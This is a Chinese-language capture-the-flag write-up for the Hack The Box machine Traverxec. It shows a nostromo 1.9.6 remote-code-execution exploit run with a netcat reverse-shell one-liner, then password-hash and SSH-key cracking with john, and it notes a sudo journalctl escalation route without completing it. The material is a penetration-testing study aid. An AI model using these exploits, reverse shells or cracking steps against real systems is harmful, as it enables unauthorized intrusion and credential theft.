### nmap

```Bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6

```



## Http

精确匹配了版本

```Bash
└─# searchsploit nostromo
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution        | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal R | linux/remote/35466.sh
```

```Bash
# 一步拿到shell
python2  47837.py 10.10.10.165 80 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 7777 >/tmp/f'
```

对80端口目录爆破异常

## Privilege Escalation

### www-data → david

```Bash
www-data@traverxec:/tmp$ ls -lh
total 12K
prw-r--r-- 1 www-data www-data    0 Feb 22 22:03 f

```

/tmp下有个名为f的pipe文件，且文件时间一直在更新，看了下named pipe相关的漏洞，都是针对windows系统的

如何获取这个管道里面的内容？

```Bash
# 有一个进程一直在cat
www-data   904     1  0 22:38 ?        00:00:00 cat /tmp/f

```

使用LinEnum没有特别的发现，没有思路，去疯狂翻目录，发现一个shadow格式的密码

```Bash
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

```

[https://www.wolai.com/pDuuCVTnGUfTynAWwPPw5Q](https://www.wolai.com/pDuuCVTnGUfTynAWwPPw5Q) 拿到david密码，但是这个密码既不是su密码，也不是ssh密码。。。

```Bash
└─# john david_passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:01:45 DONE (2023-02-23 14:43) 0.009462g/s 100096p/s 100096c/s 100096C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

没有思路，看下题解

有个隐藏的点关于nostromo 的配置，看oxdf的题解

![](https://secure2.wostatic.cn/static/ptJpvA7ZyD2Jd8TnDKz2Qa/image.png?auth_key=1677500858-v4E4EyQKQ5VDhYxT9uTjhC-0-1081ea2f810d7aa9275097559ec53c11)

配置里面有个隐藏目录，还不能直接展示，只能直接进入，有ssh秘钥文件， 把tgz文件拿到本地解压以后，直接用id_rsa无法登录

![](https://secure2.wostatic.cn/static/wtACkJrq2CxqEVQPqxSvcK/image.png?auth_key=1677500858-gxk5kxz5Ln3nhZhPnYBYfU-0-93730aa419519852fb76767a3b15d67d)

![](https://secure2.wostatic.cn/static/a6J6UdJsxF3Q5Ry7mCw9vv/image.png?auth_key=1677500858-wWtsTc7XpGBzM1W5EEKcYx-0-ca521041ce9a1577177f215e5133e35e)

john处理下，拿到秘钥，进入david

```Bash
└─# john id_rsa_david --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:00 DONE (2023-02-23 16:02) 100.0g/s 14400p/s 14400c/s 14400C/s carolina..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(root㉿walle)-[/home/…/traverxec/home/david/.ssh]
└─# ssh david@10.10.10.165 -i id_rsa
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$
david@traverxec:~$


```





### david → root

#### kernel

```Bash
www-data@traverxec:/etc/ssh$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
www-data@traverxec:/etc/ssh$
www-data@traverxec:/etc/ssh$ uname -a
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux

```

靶机没有安装gcc



#### journlctl

```Bash
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

```



看了下题解，过程有点离大谱，记住这个点就行

